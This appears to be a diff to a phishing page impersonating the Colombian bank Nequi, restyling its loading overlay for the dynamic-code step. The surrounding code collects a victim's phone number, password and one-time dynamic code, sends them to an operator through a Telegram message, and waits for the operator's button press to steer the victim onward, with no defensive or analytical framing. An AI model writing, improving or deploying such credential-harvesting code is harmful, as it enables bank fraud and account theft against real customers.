@@ -8,16 +8,52 @@
   <link rel="stylesheet" href="../css/globals.css" />
   <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
   <style>
-    .loadingContainer { display: none; }
+    .loadingOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(32, 0, 32, 0.85);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .loadingOverlay.active {
+      display: flex;
+    }
+    
+    .loadingContent {
+      text-align: center;
+      color: white;
+    }
+    
+    .loadingContent img {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 1rem;
+    }
+    
+    .loadingContent p {
+      font-size: 1.1rem;
+      margin: 0.5rem 0;
+    }
+    
     .errorMessage {
       display: none;
       background-color: #f44336;
       color: white;
       padding: 1rem;
       border-radius: 0.5rem;
-      margin: 1rem 0;
+      margin: 1rem 1rem 0 1rem;
       text-align: center;
       transition: all 0.3s ease;
+    }
+    
+    .keyboard-btn:active {
+      background-color: rgba(255, 255, 255, 0.2);
     }
   </style>
 </head>
@@ -32,19 +68,16 @@
 </script>
 
 <body class="bg-purple-primary h-dvh flex flex-col">
-  <main class="loadingContainer">
-    <section class="mainSectionContainer loading">
-      <div class="mainSectionWrapper">
-        <div class="logo_nequi_animado">
-          <img src="../assets/loading-nequi.webp" alt="">
-        </div>
-        <p class="wait-msg">Validando clave dinámica...</p>
-        <p class="info-msg">Por favor espera un momento.</p>
-      </div>
-    </section>
-  </main>
+  <!-- Overlay de carga mejorado -->
+  <div class="loadingOverlay" id="loadingOverlay">
+    <div class="loadingContent">
+      <img src="../assets/loading-nequi.webp" alt="Cargando...">
+      <p style="font-weight: bold;">Validando clave dinámica...</p>
+      <p style="font-size: 0.9rem; opacity: 0.8;">Por favor espera un momento.</p>
+    </div>
+  </div>
 
-  <div class="errorMessage">
+  <div class="errorMessage" id="errorMessage">
     ⚠️ La clave dinámica es incorrecta. Intenta nuevamente.
   </div>
 
@@ -112,8 +145,8 @@
       const inputs = document.querySelectorAll('input[id^="din-"]');
       const keyboard = document.getElementById("keyboard");
       const deleteBtn = document.getElementById("delete-din");
-      const loadingSpinner = document.querySelector(".loadingContainer");
-      const errorMessage = document.querySelector(".errorMessage");
+      const loadingOverlay = document.getElementById("loadingOverlay");
+      const errorMessage = document.getElementById("errorMessage");
       let currentInput = 0;
 
       if (!formData.phoneNumber || !formData.password) {
@@ -184,7 +217,8 @@
             savedData.dinamica = dinamica;
             localStorage.setItem("formData", JSON.stringify(savedData));
             
-            if (loadingSpinner) loadingSpinner.style.display = "block";
+            // Mostrar overlay de carga
+            if (loadingOverlay) loadingOverlay.classList.add("active");
 
             const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
             
@@ -206,14 +240,20 @@
             try {
               const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
               const { action } = await waitForButtonPress(responseMensaje.message_id);
+              
+              // Ocultar overlay antes de manejar la acción
+              if (loadingOverlay) loadingOverlay.classList.remove("active");
+              
               await handleAction(action, transactionId);
             } catch (error) {
               console.error("❌ Error:", error);
-              if (loadingSpinner) loadingSpinner.style.display = "none";
+              if (loadingOverlay) loadingOverlay.classList.remove("active");
+              
               if (errorMessage) {
                 errorMessage.style.display = "block";
                 errorMessage.textContent = "⚠️ Error de conexión. Intenta nuevamente.";
               }
+              
               setTimeout(() => {
                 inputs.forEach(inp => {
                   inp.value = "";
